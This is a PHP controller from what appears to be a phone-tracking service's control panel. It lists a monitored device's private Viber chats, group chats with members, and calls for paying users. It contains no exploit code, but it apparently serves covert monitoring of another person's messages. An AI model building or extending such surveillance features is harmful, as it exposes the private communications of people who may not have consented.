<?php

namespace Controllers;

use System\FlashMessages;

class Viber extends BaseController {

    protected $module = 'viber';
    
    protected function init() {
        parent::init();

        $this->initCP();
    }
    
    public function indexAction() {
        $viberModel = new \Models\Cp\Viber($this->di);

        if ($this->isAjaxRequest()) {
            $dataTableRequest = new \System\DataTableRequest();

            $dataTableRequest->getRequest($_GET, array('timeFrom', 'timeTo'));
            $this->checkDisplayLength($dataTableRequest->getDisplayLength());
            switch ($this->params['tab']) {
                case 'private':
                    $this->makeJSONResponse($viberModel->getPrivateDataTableData($this->di['devId'], $dataTableRequest->getResult()));
                    break;
                case 'group':
                    $this->makeJSONResponse($viberModel->getGroupDataTableData($this->di['devId'], $dataTableRequest->getResult()));
                    break;
                case 'calls':
                    $this->makeJSONResponse($viberModel->getCallsDataTableData($this->di['devId'], $dataTableRequest->getResult()));
                    break;
            }
        }

        if ($this->view->paid) {
            $this->view->hasRecords = $viberModel->hasRecords($this->di['devId']);
        }
        
        $this->setView('cp/viber.htm');
    }

    public function listAction() {
        $viberModel = new \Models\Cp\Viber($this->di);

        switch ($this->params['tab']) {
            case 'group':
                $this->view->list = $viberModel->getGroupList($this->di['devId'], $this->params['id']);
                $this->view->users = $viberModel->getGroupUsers($this->di['devId'], $this->params['id']);
                break;

            case 'private':
                $this->view->list = $viberModel->getPrivateList($this->di['devId'], $this->params['id']);
                break;
        }

        if (!count($this->view->list)) {
            $this->di['flashMessages']->add(FlashMessages::ERROR, $this->di['t']->_('The dialogue has not been found!'));
            $this->redirect($this->di['router']->getRouteUrl('viber'));
        }
        
        $this->view->tab = $this->params['tab'];

        $this->setView('cp/viberList.htm');
    }
    
    protected function postAction() {
        parent::postAction();
        $this->buildCpMenu();
        
        $this->view->title = $this->di['t']->_('Viber Tracking');
    }

}
